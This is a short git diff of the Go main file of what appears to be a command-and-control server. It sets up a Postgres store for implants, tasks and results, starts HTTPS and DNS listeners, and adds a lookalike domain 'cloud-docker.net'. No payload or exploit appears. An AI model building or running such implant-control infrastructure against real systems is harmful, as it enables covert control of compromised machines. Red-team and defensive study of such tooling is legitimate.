@@ -6,23 +6,22 @@ import (
 	"gorm.io/driver/postgres"
 	"gorm.io/gorm"
 	"log"
+	"os"
 )
 
 const (
-	DEFAULT_IMPLANT_COMM_PROTOCOL = listener.HTTPS
+	DefaultCommProtocol = listener.HTTPS
+	Domain              = "cloud-docker.net"
 )
 
-// TODO: where to put this?
 func setupDB() *gorm.DB {
-	// setup DB
-	dsn := "host=localhost user=postgres password=password dbname=postgres port=5432 sslmode=disable" // connect w/: `psql -h localhost -p 5432 -U postgres -d postgres`
+	dsn := os.Getenv("DATABASE_URL")
 	db, err := gorm.Open(postgres.Open(dsn), &gorm.Config{})
 	if err != nil {
-		// TODO: how to read these logs?
-		log.Fatalf("Failed to connect to database: %v", err)
+		log.Fatalf("Failed to connect to database: %x", err)
 	}
 	if err = db.AutoMigrate(&model.Implant{}, &model.Task{}, &model.Result{}); err != nil {
-		panic(err) // TODO: fix
+		log.Fatalf("Database connected, but AutoMigrate failed: %v", err)
 	}
 	return db
 }
@@ -30,7 +29,7 @@ func setupDB() *gorm.DB {
 func main() {
 	db := setupDB()
 
-	// TODO: does this logic make sense?
+	// httpsListener and dnsListener run concurrently under the same domain, each handling requests for implants using their respective protocols (HTTPS or DNS).
 	httpsListener, _ := listener.New(db, listener.HTTPS)
 	httpsListener.Listen()
 
